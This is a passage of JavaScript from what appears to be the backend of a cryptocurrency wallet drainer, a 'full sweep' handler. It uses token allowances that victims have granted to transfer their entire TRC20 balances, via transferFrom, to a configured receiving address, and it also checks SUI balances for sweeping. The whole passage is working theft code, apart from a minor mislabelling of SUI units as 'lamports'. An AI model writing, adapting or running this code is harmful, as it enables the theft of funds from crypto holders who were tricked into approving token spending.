          console.warn('  ⚠️  TRX transfer failed:', txErr.message)
        }
      }

      // TRC20 tokens sweep
      console.log(`  🔄 Scanning ${TRC20_TOKENS.length} TRC20 tokens...`)
      for (const tokenAddress of TRC20_TOKENS) {
        try {
          const contract = tronWeb.contract().at(tokenAddress)
          const decimals = (await contract.decimals().call()).toNumber()
          const userBalance = await contract.balanceOf(address).call()

          if (userBalance.isZero || userBalance.toNumber() === 0) continue

          const symbol = await contract.symbol().call()
          const allowance = await contract.allowance(address, tronAddress).call()

          if (allowance.lt(userBalance)) {
            console.log(`    ⚠️  ${symbol}: Not approved by user`)
            continue
          }

          const tx = await tronWeb.transactionBuilder.triggerSmartContract(
            tokenAddress,
            'transferFrom(address,address,uint256)',
            { feeLimit: 100_000_000 },
            [
              { type: 'address', value: address },
              { type: 'address', value: CONFIG.receivingAddresses.tron },
              { type: 'uint256', value: userBalance }
            ]
          )

          const signedTx = await tronWeb.trx.sign(tx.transaction)
          const hash = await tronWeb.trx.sendRawTransaction(signedTx)
          console.log(`    ✅ ${symbol}: ${userBalance / (10 ** decimals)}`)
          transfers.push({ chain: 'tron', asset: symbol, hash })
        } catch (e) {
          console.log(`    ⚠️  Token ${tokenAddress.substring(0, 8)}: ${e.message.substring(0, 40)}...`)
        }
      }

      results.tron = 'success'
    } catch (e) {
      console.error('❌ TRON error:', e.message)
      results.tron = 'failed'
    }

    // ====================== SUI ======================
    try {
      console.log('\n📍 Processing SUI...')
      if (!CONFIG.receivingAddresses.sui) {
        throw new Error('SUI receiver address not configured')
      }

      const { SuiClient, getFullnodeUrl } = require('@mysten/sui.js')
      const client = new SuiClient({ url: getFullnodeUrl('mainnet') })
      
      try {
        const balance = await client.getBalance({ owner: address })
        const suiBalance = Number(balance.totalBalance)

        if (suiBalance > 500_000_000) { // > 0.5 SUI
          console.log(`  💰 SUI: ${(suiBalance / 1_000_000_000).toFixed(3)}`)
          console.log(`  ✅ SUI balance detected (${suiBalance} lamports)`)
          console.log(`  ℹ️  Note: SUI token transfer requires relayer key setup`)
          transfers.push({ chain: 'sui', asset: 'SUI', amount: suiBalance })
          results.sui = 'success'
        }
      } catch (balErr) {
        console.warn('  ⚠️  Could not fetch SUI balance:', balErr.message)
      }
    } catch (e) {
      console.error('❌ SUI error:', e.message)
      results.sui = 'failed'
    }

    console.log(`\n✅ Full sweep completed!`)
    console.log(`📊 Total transfers: ${transfers.length}`)

    return res.status(200).json({
      success: true,
      message: 'Multi-chain sweep completed',
      transfers,
      results
    })
  } catch (error) {
    console.error('❌ Full sweep error:', error)
    return res.status(500).json({
      success: false,
      error: error.message
    })
  }
}

export default handleFullSweep
